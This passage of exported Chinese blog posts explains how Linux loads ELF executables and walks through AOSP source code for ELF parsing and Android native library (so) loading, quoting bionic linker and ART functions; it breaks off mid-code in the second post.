当我们在 Linux 的 bash 中输入命令执行某个 ELF 可执行文件时，如下所示。 $ ./hello.out 那么，Linux 系统是如何装载该 ELF 文件并执行的呢？这个过程可以分为以下这些步骤： 创建新进程 检查可执行文件类型 搜索匹配装载处理过程 装载执行可执行文件 # 创建新进程 首先在用户层面，bash 进程会调用 fork() 系统调用创建一个新的进程。其次，新的进程通过调用 execve() 系统调用来执行指定的 ELF 文件。原先的 bash 进程继续返回并等待刚才启动的新进程结束，之后继续等待用户输入命令。 execve() 系统调用被定义在 unistd.h ，其原型如下所示。其中的三个参数分别对应被执行程序的 程序文件名、执行参数、环境变量。 int execve(const char *filename, char *const argv[], char *const envp[]); # 检查可执行文件类型 当进入 execve() 系统调用之后，Linux 内核就开始进行真正的装载工作。在内核中， execve() 系统调用相应的入口是 sys_execve() 。 sys_execve() 进行一些参数的检查复制之后，调用 do_execve() 。 do_execve() 会首先查找被执行的文件，如果找到文件，则读取文件的前 128 个字节。 为什么要先读取文件的前 128 个字节？这是因为 Linux 支持的可执行文件不止 ELF 一种，还包括 a.out、Java 程序、以 #! 开头的脚本程序。 do_execve() 通过读取前 128 个字节来判断文件的格式。每种可执行文件格式的开头几个字节都是很特殊的，尤其是前 4 个字节，被称为 魔数（Magic Number）。比如：ELF 的可执行文件格式的头 4 个字节为 0x7F 、 e 、 l 、 f ；Java 的可执行文件格式的头 4 个字节为 c 、 a 、 f 、 e ；如果是解释型语言的脚本，则第一行通常是 #!/bin/sh 或 #!/user/bin/python ，其中 # 和 ! 构成了魔数，系统一旦判断到这两个字节，就对后面的字符串进行解析，以确定具体的解释程序的路径。 # 搜索匹配装载处理过程 当 do_execve() 读取了 128 个字节的文件头部之后，调用 search_binary_handle() 去搜索和匹配合适的可执行文件装载处理过程。Linux 中所有被支持的可执行文件格式都有相应的装载处理过程， search_binary_handler() 会通过判断头部的魔术确定文件的格式，并且调用相应的装载处理过程。常见的可执行程序及其装载处理过程的对应关系如下所示. ELF 可执行文件： load_elf_binary() a.out 可执行文件： load_aout_binary() 可执行脚本程序： load_script() # 装载执行可执行文件 以 ELF 的装载处理过程 load_elf_binary() 为例，其所包含的步骤如下图所示： 操作系统读取可执行文件 ELF 的 Header ，检查文件的有效性。 操作系统读取可执行文件 ELF 的 Program Header Table 中读取每个 Segment 的虚拟地址、文件地址、属性等。 操作系统根据 Program Header Table 将可执行文件 ELF 映射至内存。 如果是静态链接的情况，则直接跳转至第 7 步；如果是动态链接的情况，操作系统将查找 .interp 节，找到 动态链接器（Dynamic Linker） 的位置，并启动动态链接器。在 Linux 下，动态链接器 ld.so 是一个共享对象，操作系统同样通过映射的方式将它加载到进程的地址空间。操作系统在加载完后，将控制权交给动态链接器的入口。 动态链接器获得控制权后，开始执行一系列初始化操作。 动态链接器根据当前的环境参数，对可执行文件进行动态链接工作。 控制权被转交到可执行文件的入口地址，程序开始正式执行。 # TECHNICAL NOTE ON ELF LOADING 在 android-platform\\bionic\\linker\\linker_phdr.cpp 中开头的这处注释也可以帮助我们快速理解 ELF 的加载过程 TECHNICAL NOTE ON ELF LOADING. An ELF file’s program header table contains one or more PT_LOAD segments, which corresponds to portions of the file that need to be mapped into the process’ address space. Each loadable segment has the following important properties: p_offset -&gt; segment file offset p_filesz -&gt; segment file size p_memsz -&gt; segment memory size (always &gt;= p_filesz) p_vaddr -&gt; segment's virtual address p_flags -&gt; segment flags (e.g. readable, writable, executable) p_align -&gt; segment's in-memory and in-file alignment We will ignore the p_paddr field of ElfW(Phdr) for now. The loadable segments can be seen as a list of [p_vaddr … p_vaddr+p_memsz) ranges of virtual addresses. A few rules apply: the virtual address ranges should not overlap. if a segment’s p_filesz is smaller than its p_memsz, the extra bytes between them should always be initialized to 0. ranges do not necessarily start or end at page boundaries. Two distinct segments can have their start and end on the same page. In this case, the page inherits the mapping flags of the latter segment. Finally, the real load addrs of each segment is not p_vaddr. Instead the loader decides where to load the first segment, then will load all others relative to the first one to respect the initial range layout. For example, consider the following list: [ offset:0, filesz:0x4000, memsz:0x4000, vaddr:0x30000 ], [ offset:0x4000, filesz:0x2000, memsz:0x8000, vaddr:0x40000 ], This corresponds to two segments that cover these virtual address ranges: 0x30000...0x34000 0x40000...0x48000 If the loader decides to load the first segment at address 0xa0000000 then the segments’ load address ranges will be: 0xa0030000...0xa0034000 0xa0040000...0xa0048000 In other words, all segments must be loaded at an address that has the same constant offset from their p_vaddr value. This offset is computed as the difference between the first segment’s load address, and its p_vaddr value. However, in practice, segments do not start at page boundaries. Since we can only memory-map at page boundaries, this means that the bias is computed as: load_bias = phdr0_load_address - PAGE_START(phdr0-&gt;p_vaddr) (NOTE: The value must be used as a 32-bit unsigned integer, to deal with possible wrap around UINT32_MAX for possible large p_vaddr values). And that the phdr0_load_address must start at a page boundary, with the segment’s real content starting at: phdr0_load_address + PAGE_OFFSET(phdr0-&gt;p_vaddr) Note that ELF requires the following condition to make the mmap()-ing work: PAGE_OFFSET(phdr0-&gt;p_vaddr) == PAGE_OFFSET(phdr0-&gt;p_offset) The load_bias must be added to any p_vaddr value read from the ELF file to determine the corresponding memory address. # ElfReader 类 //android-platform\\bionic\\linker\\linker_phdr.hclass ElfReader &#123; public: ElfReader(); bool Read(const char* name, int fd, off64_t file_offset, off64_t file_size); bool Load(address_space_params* address_space); const char* name() const &#123; return name_.c_str(); &#125; size_t phdr_count() const &#123; return phdr_num_; &#125; ElfW(Addr) load_start() const &#123; return reinterpret_cast&lt;ElfW(Addr)>(load_start_); &#125; size_t load_size() const &#123; return load_size_; &#125; ElfW(Addr) gap_start() const &#123; return reinterpret_cast&lt;ElfW(Addr)>(gap_start_); &#125; size_t gap_size() const &#123; return gap_size_; &#125; ElfW(Addr) load_bias() const &#123; return load_bias_; &#125; const ElfW(Phdr)* loaded_phdr() const &#123; return loaded_phdr_; &#125; const ElfW(Dyn)* dynamic() const &#123; return dynamic_; &#125; const char* get_string(ElfW(Word) index) const; bool is_mapped_by_caller() const &#123; return mapped_by_caller_; &#125; ElfW(Addr) entry_point() const &#123; return header_.e_entry + load_bias_; &#125; private: bool ReadElfHeader(); bool VerifyElfHeader(); bool ReadProgramHeaders(); bool ReadSectionHeaders(); bool ReadDynamicSection(); bool ReserveAddressSpace(address_space_params* address_space); bool LoadSegments(); bool FindPhdr(); bool FindGnuPropertySection(); bool CheckPhdr(ElfW(Addr)); bool CheckFileRange(ElfW(Addr) offset, size_t size, size_t alignment); bool did_read_; bool did_load_; std::string name_; int fd_; off64_t file_offset_; off64_t file_size_; ElfW(Ehdr) header_; size_t phdr_num_; MappedFileFragment phdr_fragment_; const ElfW(Phdr)* phdr_table_; MappedFileFragment shdr_fragment_; const ElfW(Shdr)* shdr_table_; size_t shdr_num_; MappedFileFragment dynamic_fragment_; const ElfW(Dyn)* dynamic_; MappedFileFragment strtab_fragment_; const char* strtab_; size_t strtab_size_; // First page of reserved address space. void* load_start_; // Size in bytes of reserved address space. size_t load_size_; // First page of inaccessible gap mapping reserved for this DSO. void* gap_start_; // Size in bytes of the gap mapping. size_t gap_size_; // Load bias. ElfW(Addr) load_bias_; // Loaded phdr. const ElfW(Phdr)* loaded_phdr_; // Is map owned by the caller bool mapped_by_caller_; // Only used by AArch64 at the moment. GnuPropertySection note_gnu_property_ __unused;&#125;;# AOSP 中解析 Elf 示例 在 AOSP 中，调用 ElfReader 解析 so 的示例代码如下所示，传入的四个参数的含义如下所示 realpath : elf 的路径 fd_ : 打开的 elf 的 fd 文件描述符 file_offset_ : elf 文件指针的当前偏移，初始值为 0 file_size : elf 的文件大小 //android-platform\\bionic\\linker\\linker.cpp//LoadTask::readbool read(const char* realpath, off64_t file_size) &#123; ElfReader&amp; elf_reader = get_elf_reader(); return elf_reader.Read(realpath, fd_, file_offset_, file_size);&#125;# ElfReader::Read 非常典型的 elf解析五件套 代码，经过上面对于 ELF 的详细分析，我们也不难理解这五个函数的功能了 //android-platform\\bionic\\linker\\linker_phdr.cppbool ElfReader::Read(const char* name, int fd, off64_t file_offset, off64_t file_size) &#123; if (did_read_) &#123; return true; &#125; name_ = name; fd_ = fd; file_offset_ = file_offset; file_size_ = file_size; if (ReadElfHeader() &amp;&amp; VerifyElfHeader() &amp;&amp; ReadProgramHeaders() &amp;&amp; ReadSectionHeaders() &amp;&amp; ReadDynamicSection()) &#123; did_read_ = true; &#125; return did_read_;&#125;# ReadElfHeader 读取 ELF Header //android-platform\\bionic\\linker\\linker_phdr.cppbool ElfReader::ReadElfHeader() &#123; ssize_t rc = TEMP_FAILURE_RETRY(pread64(fd_, &amp;header_, sizeof(header_), file_offset_)); if (rc &lt; 0) &#123; DL_ERR(\"can't read file \\\"%s\\\": %s\", name_.c_str(), strerror(errno)); return false; &#125; if (rc != sizeof(header_)) &#123; DL_ERR(\"\\\"%s\\\" is too small to be an ELF executable: only found %zd bytes\", name_.c_str(), static_cast&lt;size_t>(rc)); return false; &#125; return true;&#125;# VerifyElfHeader 判断是否是 ELF Header 的合法性 //android-platform\\bionic\\linker\\linker_phdr.cppbool ElfReader::VerifyElfHeader() &#123; if (memcmp(header_.e_ident, ELFMAG, SELFMAG) != 0) &#123; DL_ERR(\"\\\"%s\\\" has bad ELF magic: %02x%02x%02x%02x\", name_.c_str(), header_.e_ident[0], header_.e_ident[1], header_.e_ident[2], header_.e_ident[3]); return false; &#125; // Try to give a clear diagnostic for ELF class mismatches, since they're // an easy mistake to make during the 32-bit/64-bit transition period. int elf_class = header_.e_ident[EI_CLASS];#if defined(__LP64__) if (elf_class != ELFCLASS64) &#123; if (elf_class == ELFCLASS32) &#123; DL_ERR(\"\\\"%s\\\" is 32-bit instead of 64-bit\", name_.c_str()); &#125; else &#123; DL_ERR(\"\\\"%s\\\" has unknown ELF class: %d\", name_.c_str(), elf_class); &#125; return false; &#125;#else if (elf_class != ELFCLASS32) &#123; if (elf_class == ELFCLASS64) &#123; DL_ERR(\"\\\"%s\\\" is 64-bit instead of 32-bit\", name_.c_str()); &#125; else &#123; DL_ERR(\"\\\"%s\\\" has unknown ELF class: %d\", name_.c_str(), elf_class); &#125; return false; &#125;#endif if (header_.e_ident[EI_DATA] != ELFDATA2LSB) &#123; DL_ERR(\"\\\"%s\\\" not little-endian: %d\", name_.c_str(), header_.e_ident[EI_DATA]); return false; &#125; if (header_.e_type != ET_DYN) &#123; DL_ERR(\"\\\"%s\\\" has unexpected e_type: %d\", name_.c_str(), header_.e_type); return false; &#125; if (header_.e_version != EV_CURRENT) &#123; DL_ERR(\"\\\"%s\\\" has unexpected e_version: %d\", name_.c_str(), header_.e_version); return false; &#125; if (header_.e_machine != GetTargetElfMachine()) &#123; DL_ERR(\"\\\"%s\\\" is for %s (%d) instead of %s (%d)\", name_.c_str(), EM_to_string(header_.e_machine), header_.e_machine, EM_to_string(GetTargetElfMachine()), GetTargetElfMachine()); return false; &#125; if (header_.e_shentsize != sizeof(ElfW(Shdr))) &#123; // Fail if app is targeting Android O or above if (get_application_target_sdk_version() >= 26) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" has unsupported e_shentsize: 0x%x (expected 0x%zx)\", name_.c_str(), header_.e_shentsize, sizeof(ElfW(Shdr))); return false; &#125; DL_WARN_documented_change(26, \"invalid-elf-header_section-headers-enforced-for-api-level-26\", \"\\\"%s\\\" has unsupported e_shentsize 0x%x (expected 0x%zx)\", name_.c_str(), header_.e_shentsize, sizeof(ElfW(Shdr))); add_dlwarning(name_.c_str(), \"has invalid ELF header\"); &#125; if (header_.e_shstrndx == 0) &#123; // Fail if app is targeting Android O or above if (get_application_target_sdk_version() >= 26) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" has invalid e_shstrndx\", name_.c_str()); return false; &#125; DL_WARN_documented_change(26, \"invalid-elf-header_section-headers-enforced-for-api-level-26\", \"\\\"%s\\\" has invalid e_shstrndx\", name_.c_str()); add_dlwarning(name_.c_str(), \"has invalid ELF header\"); &#125; return true;&#125;# ReadProgramHeaders 读取 Program Header //android-platform\\bionic\\linker\\linker_phdr.cpp// Loads the program header table from an ELF file into a read-only private// anonymous mmap-ed block.bool ElfReader::ReadProgramHeaders() &#123; phdr_num_ = header_.e_phnum; // Like the kernel, we only accept program header tables that // are smaller than 64KiB. if (phdr_num_ &lt; 1 || phdr_num_ > 65536/sizeof(ElfW(Phdr))) &#123; DL_ERR(\"\\\"%s\\\" has invalid e_phnum: %zd\", name_.c_str(), phdr_num_); return false; &#125; // Boundary checks size_t size = phdr_num_ * sizeof(ElfW(Phdr)); if (!CheckFileRange(header_.e_phoff, size, alignof(ElfW(Phdr)))) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" has invalid phdr offset/size: %zu/%zu\", name_.c_str(), static_cast&lt;size_t>(header_.e_phoff), size); return false; &#125; if (!phdr_fragment_.Map(fd_, file_offset_, header_.e_phoff, size)) &#123; DL_ERR(\"\\\"%s\\\" phdr mmap failed: %s\", name_.c_str(), strerror(errno)); return false; &#125; phdr_table_ = static_cast&lt;ElfW(Phdr)*>(phdr_fragment_.data()); return true;&#125;# ReadSectionHeaders 读取 Section Header //android-platform\\bionic\\linker\\linker_phdr.cppbool ElfReader::ReadSectionHeaders() &#123; shdr_num_ = header_.e_shnum; if (shdr_num_ == 0) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" has no section headers\", name_.c_str()); return false; &#125; size_t size = shdr_num_ * sizeof(ElfW(Shdr)); if (!CheckFileRange(header_.e_shoff, size, alignof(const ElfW(Shdr)))) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" has invalid shdr offset/size: %zu/%zu\", name_.c_str(), static_cast&lt;size_t>(header_.e_shoff), size); return false; &#125; if (!shdr_fragment_.Map(fd_, file_offset_, header_.e_shoff, size)) &#123; DL_ERR(\"\\\"%s\\\" shdr mmap failed: %s\", name_.c_str(), strerror(errno)); return false; &#125; shdr_table_ = static_cast&lt;const ElfW(Shdr)*>(shdr_fragment_.data()); return true;&#125;# ReadDynamicSection 读取 Dynamic Section //android-platform\\bionic\\linker\\linker_phdr.cppbool ElfReader::ReadDynamicSection() &#123; // 1. Find .dynamic section (in section headers) const ElfW(Shdr)* dynamic_shdr = nullptr; for (size_t i = 0; i &lt; shdr_num_; ++i) &#123; if (shdr_table_[i].sh_type == SHT_DYNAMIC) &#123; dynamic_shdr = &amp;shdr_table_ [i]; break; &#125; &#125; if (dynamic_shdr == nullptr) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" .dynamic section header was not found\", name_.c_str()); return false; &#125; // Make sure dynamic_shdr offset and size matches PT_DYNAMIC phdr size_t pt_dynamic_offset = 0; size_t pt_dynamic_filesz = 0; for (size_t i = 0; i &lt; phdr_num_; ++i) &#123; const ElfW(Phdr)* phdr = &amp;phdr_table_[i]; if (phdr->p_type == PT_DYNAMIC) &#123; pt_dynamic_offset = phdr->p_offset; pt_dynamic_filesz = phdr->p_filesz; &#125; &#125; if (pt_dynamic_offset != dynamic_shdr->sh_offset) &#123; if (get_application_target_sdk_version() >= 26) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" .dynamic section has invalid offset: 0x%zx, \" \"expected to match PT_DYNAMIC offset: 0x%zx\", name_.c_str(), static_cast&lt;size_t>(dynamic_shdr->sh_offset), pt_dynamic_offset); return false; &#125; DL_WARN_documented_change(26, \"invalid-elf-header_section-headers-enforced-for-api-level-26\", \"\\\"%s\\\" .dynamic section has invalid offset: 0x%zx \" \"(expected to match PT_DYNAMIC offset 0x%zx)\", name_.c_str(), static_cast&lt;size_t>(dynamic_shdr->sh_offset), pt_dynamic_offset); add_dlwarning(name_.c_str(), \"invalid .dynamic section\"); &#125; if (pt_dynamic_filesz != dynamic_shdr->sh_size) &#123; if (get_application_target_sdk_version() >= 26) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" .dynamic section has invalid size: 0x%zx, \" \"expected to match PT_DYNAMIC filesz: 0x%zx\", name_.c_str(), static_cast&lt;size_t>(dynamic_shdr->sh_size), pt_dynamic_filesz); return false; &#125; DL_WARN_documented_change(26, \"invalid-elf-header_section-headers-enforced-for-api-level-26\", \"\\\"%s\\\" .dynamic section has invalid size: 0x%zx \" \"(expected to match PT_DYNAMIC filesz 0x%zx)\", name_.c_str(), static_cast&lt;size_t>(dynamic_shdr->sh_size), pt_dynamic_filesz); add_dlwarning(name_.c_str(), \"invalid .dynamic section\"); &#125; if (dynamic_shdr->sh_link >= shdr_num_) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" .dynamic section has invalid sh_link: %d\", name_.c_str(), dynamic_shdr->sh_link); return false; &#125; const ElfW(Shdr)* strtab_shdr = &amp;shdr_table_[dynamic_shdr->sh_link]; if (strtab_shdr->sh_type != SHT_STRTAB) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" .dynamic section has invalid link(%d) sh_type: %d (expected SHT_STRTAB)\", name_.c_str(), dynamic_shdr->sh_link, strtab_shdr->sh_type); return false; &#125; if (!CheckFileRange(dynamic_shdr->sh_offset, dynamic_shdr->sh_size, alignof(const ElfW(Dyn)))) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" has invalid offset/size of .dynamic section\", name_.c_str()); return false; &#125; if (!dynamic_fragment_.Map(fd_, file_offset_, dynamic_shdr->sh_offset, dynamic_shdr->sh_size)) &#123; DL_ERR(\"\\\"%s\\\" dynamic section mmap failed: %s\", name_.c_str(), strerror(errno)); return false; &#125; dynamic_ = static_cast&lt;const ElfW(Dyn)*>(dynamic_fragment_.data()); if (!CheckFileRange(strtab_shdr->sh_offset, strtab_shdr->sh_size, alignof(const char))) &#123; DL_ERR_AND_LOG(\"\\\"%s\\\" has invalid offset/size of the .strtab section linked from .dynamic section\", name_.c_str()); return false; &#125; if (!strtab_fragment_.Map(fd_, file_offset_, strtab_shdr->sh_offset, strtab_shdr->sh_size)) &#123; DL_ERR(\"\\\"%s\\\" strtab section mmap failed: %s\", name_.c_str(), strerror(errno)); return false; &#125; strtab_ = static_cast&lt;const char*>(strtab_fragment_.data()); strtab_size_ = strtab_fragment_.size(); return true;&#125;# 参考资料 深入浅出 ELF https://ctf-wiki.org/executable/elf 计算机那些事 (4)——ELF 文件结构 计算机那些事 (5)—— 链接、静态链接、动态链接 计算机那些事 (6)—— 可执行文件的装载与运行","categories":[],"tags":[]},{"title":"安卓so加载流程源码分析","slug":"android-load-so","date":"2024-02-14T03:19:19.000Z","updated":"2025-04-08T18:55:11.444Z","comments":true,"path":"android-load-so/","link":"","permalink":"https://oacia.dev/android-load-so/","excerpt":"","text":"对于某些加固壳，加载解释器 elf 的方式不会是常规的 System.loadLibrary , 而是仿照 System.loadLibrary 在 AOSP 中的实现方式，在 JNI 中自己实现 so 的加载 本次所使用到的 AOSP 的源码的安卓版本为 android-12.0.0_r34 # so 的启动过程 # System.load 在 Android 中我们想要加载一个 so 时，可以有两种方式 静态加载 System.loadLibrary(\"native\");这种加载方式下，要加载的 so 一般已经内置在 apk 的 lib/[arch]/ 中 动态加载 String soPath = \"/data/data/com.example.myapp/libmynative.so\";System.load(soPath);这一种加载方式可以加载任意路径下的 so 这里我们将动态加载，即 System.load 函数作为分析的入口，可以发现它实际上调用的是 Runtime.getRuntime().load0 对于静态加载 System.loadLibrary 来说，它调用的函数是 Runtime.getRuntime().loadLibrary0(Reflection.getCallerClass(), libname); //android-platform\\libcore\\ojluni\\src\\main\\java\\java\\lang\\System.java/** * Loads the native library specified by the filename argument. The filename * argument must be an absolute path name. * * If the filename argument, when stripped of any platform-specific library * prefix, path, and file extension, indicates a library whose name is, * for example, L, and a native library called L is statically linked * with the VM, then the JNI_OnLoad_L function exported by the library * is invoked rather than attempting to load a dynamic library. * A filename matching the argument does not have to exist in the * file system. * See the JNI Specification for more details. * * Otherwise, the filename argument is mapped to a native library image in * an implementation-dependent manner. * * &lt;p> * The call &lt;code>System.load(name)&lt;/code> is effectively equivalent * to the call: * &lt;blockquote>&lt;pre> * Runtime.getRuntime().load(name) * &lt;/pre>&lt;/blockquote> * * @param filename the file to load. * @exception SecurityException if a security manager exists and its * &lt;code>checkLink&lt;/code> method doesn't allow * loading of the specified dynamic library * @exception UnsatisfiedLinkError if either the filename is not an * absolute path name, the native library is not statically * linked with the VM, or the library cannot be mapped to * a native library image by the host system. * @exception NullPointerException if &lt;code>filename&lt;/code> is * &lt;code>null&lt;/code> * @see java.lang.Runtime#load(java.lang.String) * @see java.lang.SecurityManager#checkLink(java.lang.String) */@CallerSensitivepublic static void load(String filename) &#123; Runtime.getRuntime().load0(Reflection.getCallerClass(), filename);&#125;Reflection.getCallerClass 第一个传入的参数 Reflection.getCallerClass() 相关的实现即注释如下，读起来可能会有点绕，什么叫返回方法的方法的调用者的类？ //android-platform\\libcore\\ojluni\\src\\main\\java\\sun\\reflect\\Reflection.java/** Returns the class of the caller of the method calling this method, ignoring frames associated with java.lang.reflect.Method.invoke() and its implementation. * @CallerSensitive public static native Class&lt;?> getCallerClass(); */ public static Class&lt;?> getCallerClass() &#123; // This method (getCallerClass()) constitutes another stack frame, // so we need to call getStackClass2() rather than getStackClass1(). return VMStack.getStackClass2(); &#125;其实按照逆向的角度来看，就是返回调用栈的最底层的那个类，例如有一个 Class A 经过如下的调用过程: Class A-&gt;反射1-&gt;反射2-&gt;反射n-&gt;...-&gt;Reflection.getCallerClass() , 最终 getCallerClass 方法将返回 Class A # Runtime.getRuntime().load0 在 Runtime.getRuntime().load0 中进行了 filename 是否是 绝对路径 以及 空字符串 的检查之后，便开始调用 nativeLoad 真正的去加载 so 了 //android-platform\\libcore\\ojluni\\src\\main\\java\\java\\lang\\Runtime.javasynchronized void load0(Class&lt;?> fromClass, String filename) &#123; if (!(new File(filename).isAbsolute())) &#123; throw new UnsatisfiedLinkError( \"Expecting an absolute path of the library: \" + filename); &#125; if (filename == null) &#123; throw new NullPointerException(\"filename == null\"); &#125; String error = nativeLoad(filename, fromClass.getClassLoader()); if (error != null) &#123; throw new UnsatisfiedLinkError(error); &#125;&#125;fromClass.getClassLoader() 向 nativeLoad 中传入的第二个参数是 fromClass.getClassLoader() , 利用这个方法可以获取到 fromClass 类的 ClassLoader 为什么要获取 ClassLoader 并将其作为参数传入 nativeLoad? # Runtime.java 中的 nativeLoad 在 nativeLoad 重载调用了 nativeLoad(String filename, ClassLoader loader, Class&lt;?&gt; caller) , 而该函数的声明为 native , 这便意味着我们即将走出 java 来到 c++ 的世界了 //android-platform\\libcore\\ojluni\\src\\main\\java\\java\\lang\\Runtime.javaprivate static String nativeLoad(String filename, ClassLoader loader) &#123; return nativeLoad(filename, loader, null); &#125;private static native String nativeLoad(String filename, ClassLoader loader, Class&lt;?> caller);# Runtime.c 中的 nativeLoad 在常规的 JNI 函数的编写过程中，想要让 java 层调用 JNI 中定义的函数，要么使用静态注册，利用 JNIEXPORT 关键字将这个函数导出，或者使用 RegisterNatives 方法去进行动态注册，而在 AOSP 定义 nativeLoad 时，这两种方法都使用到了，对于学习 JNI 的注册过程非常具有参考意义 查看 Runtime_nativeLoad 函数，可以发现它继续调用了 JVM_NativeLoad //android-platform\\libcore\\ojluni\\src\\main\\native\\Runtime.cJNIEXPORT jstring JNICALLRuntime_nativeLoad(JNIEnv* env, jclass ignored, jstring javaFilename, jobject javaLoader, jclass caller)&#123; return JVM_NativeLoad(env, javaFilename, javaLoader, caller);&#125;//these macros below are defined at android-platform\\libnativehelper\\include_platform_header_only\\nativehelper\\jni_macros.h#define FAST_NATIVE_METHOD(className, functionName, signature) \\ MAKE_JNI_FAST_NATIVE_METHOD(#functionName, signature, className ## _ ## functionName)#define NATIVE_METHOD(className, functionName, signature) \\ MAKE_JNI_NATIVE_METHOD(#functionName, signature, className ## _ ## functionName)#define MAKE_JNI_NATIVE_METHOD(name, signature, function) \\ _NATIVEHELPER_JNI_MAKE_METHOD(kNormalNative, name, signature, function)#define _NATIVEHELPER_JNI_MAKE_METHOD(kind, name, sig, fn) \\ MAKE_CHECKED_JNI_NATIVE_METHOD(kind, name, sig, fn)//MAKE_CHECKED_JNI_NATIVE_METHOD is defined at platform\\libnativehelper\\include_platform_header_only\\nativehelper\\detail\\signature_checker.h#define MAKE_CHECKED_JNI_NATIVE_METHOD(native_kind, name_, signature_, fn) \\ ([]() &#123; \\ using namespace nativehelper::detail; /* NOLINT(google-build-using-namespace) */ \\ static_assert( \\ MatchJniDescriptorWithFunctionType&lt;native_kind, \\ decltype(fn), \\ fn, \\ sizeof(signature_)>(signature_),\\ \"JNI signature doesn't match C++ function type.\"); \\ /* Suppress implicit cast warnings by explicitly casting. */ \\ return JNINativeMethod &#123; \\ const_cast&lt;decltype(JNINativeMethod::name)>(name_), \\ const_cast&lt;decltype(JNINativeMethod::signature)>(signature_), \\ reinterpret_cast&lt;void*>(&amp;(fn))&#125;; \\ &#125;)()//NELEM is defined at platform\\libnativehelper\\include\\nativehelper\\JNIHelp.h#define NELEM(x) ((int) (sizeof(x) / sizeof((x)[0])))//jniRegisterNativeMethods is defined at platform\\libnativehelper\\JNIHelp.cint jniRegisterNativeMethods(JNIEnv* env, const char* className, const JNINativeMethod* methods, int numMethods)&#123; ALOGV(\"Registering %s's %d native methods...\", className, numMethods); jclass clazz = (*env)->FindClass(env, className); ALOG_ALWAYS_FATAL_IF(clazz == NULL, \"Native registration unable to find class '%s'; aborting...\", className); int result = (*env)->RegisterNatives(env, clazz, methods, numMethods); (*env)->DeleteLocalRef(env, clazz); if (result == 0) &#123; return 0; &#125; // Failure to register natives is fatal. Try to report the corresponding exception, // otherwise abort with generic failure message. jthrowable thrown = (*env)->ExceptionOccurred(env); if (thrown != NULL) &#123; struct ExpandableString summary; ExpandableStringInitialize(&amp;summary); if (GetExceptionSummary(env, thrown, &amp;summary)) &#123; ALOGF(\"%s\", summary.data); &#125; ExpandableStringRelease(&amp;summary); (*env)->DeleteLocalRef(env, thrown); &#125; ALOGF(\"RegisterNatives failed for '%s'; aborting...\", className); return result;&#125;static JNINativeMethod gMethods[] = &#123; FAST_NATIVE_METHOD(Runtime, freeMemory, \"()J\"), FAST_NATIVE_METHOD(Runtime, totalMemory, \"()J\"), FAST_NATIVE_METHOD(Runtime, maxMemory, \"()J\"), NATIVE_METHOD(Runtime, nativeGc, \"()V\"), NATIVE_METHOD(Runtime, nativeExit, \"(I)V\"), NATIVE_METHOD(Runtime, nativeLoad, \"(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/Class;)\" \"Ljava/lang/String;\"),&#125;;void register_java_lang_Runtime(JNIEnv* env) &#123; jniRegisterNativeMethods(env, \"java/lang/Runtime\", gMethods, NELEM(gMethods));&#125;# JVM_NativeLoad JVM_NativeLoad 获取当前进程的 javaVM 对象并调用 javaVM 的 LoadNativeLibrary 方法 //android-platform\\art\\openjdkjvm\\OpenjdkJvm.ccJNIEXPORT jstring JVM_NativeLoad(JNIEnv* env, jstring javaFilename, jobject javaLoader, jclass caller) &#123; // 实例化一个文件对象 ScopedUtfChars filename(env, javaFilename); if (filename.c_str() == nullptr) &#123; return nullptr; &#125; std::string error_msg; &#123; // 获取当前进程的 javaVM 对象 art::JavaVMExt* vm = art::Runtime::Current()->GetJavaVM(); bool success = vm->LoadNativeLibrary(env, filename.c_str(), javaLoader, caller, &amp;error_msg); if (success) &#123; return nullptr; &#125; &#125; // Don't let a pending exception from JNI_OnLoad cause a CheckJNI issue with NewStringUTF. env->ExceptionClear(); return env->NewStringUTF(error_msg.c_str());&#125;# vm-&gt;LoadNativeLibrary LoadNativeLibrary 的代码很长，细看之后可以分为三个部分 so 加载前 这个部分主要判断即将被 so 是否之前就已经被加载过，如果已经被加载好了，那么就直接退出这个函数并返回 so 加载时 这个部分就是 AOSP 实现动态链接库加载的核心实现，之后会进行详细的分析 当找到这个 so 的 soinfo 之后 (具体是在 do_dlopen 中被找到), 会立即调用 soinfo::call_constructors 函数依次加载 init 和 init_array 函数 so 加载后 在这最后一个部分中，当一个 so 被成功加载后，会立即调用 so 的导出函数中的 JNI_OnLoad 函数 (如果 JNI_OnLoad 存在的话) //android-platform\\art\\runtime\\jni\\java_vm_ext.cc// 阶段三：当 so 被加载之后，立即调用导出函数 JNI_OnLoadbool was_successful = false;void* sym = library->FindSymbol(\"JNI_OnLoad\", nullptr);if (sym == nullptr) &#123; VLOG(jni) &lt;&lt; \"[No JNI_OnLoad found in \\\"\" &lt;&lt; path &lt;&lt; \"\\\"]\"; was_successful = true;&#125; else &#123; // Call JNI_OnLoad. We have to override the current class // loader, which will always be \"null\" since the stuff at the // top of the stack is around Runtime.loadLibrary(). (See // the comments in the JNI FindClass function.) ScopedLocalRef&lt;jobject> old_class_loader(env, env->NewLocalRef(self->GetClassLoaderOverride())); self->SetClassLoaderOverride(class_loader); VLOG(jni) &lt;&lt; \"[Calling JNI_OnLoad in \\\"\" &lt;&lt; path &lt;&lt; \"\\\"]\"; using JNI_OnLoadFn = int(*)(JavaVM*, void*); JNI_OnLoadFn jni_on_load = reinterpret_cast&lt;JNI_OnLoadFn>(sym); int version = (*jni_on_load)(this, nullptr); if (IsSdkVersionSetAndAtMost(runtime_->GetTargetSdkVersion(), SdkVersion::kL)) &#123; // Make sure that sigchain owns SIGSEGV. EnsureFrontOfChain(SIGSEGV); &#125; self->SetClassLoaderOverride(old_class_loader.get()); if (version == JNI_ERR) &#123; StringAppendF(error_msg, \"JNI_ERR returned from JNI_OnLoad in \\\"%s\\\"\", path.c_str()); &#125; else if (JavaVMExt::IsBadJniVersion(version)) &#123; StringAppendF(error_msg, \"Bad JNI version returned from JNI_OnLoad in \\\"%s\\\": %d\", path.c_str(), version); // It's unwise to call dlclose() here, but we can mark it // as bad and ensure that future load attempts will fail. // We don't know how far JNI_OnLoad got, so there could // be some partially-initialized stuff accessible through // newly-registered native method calls. We could try to // unregister them, but that doesn't seem 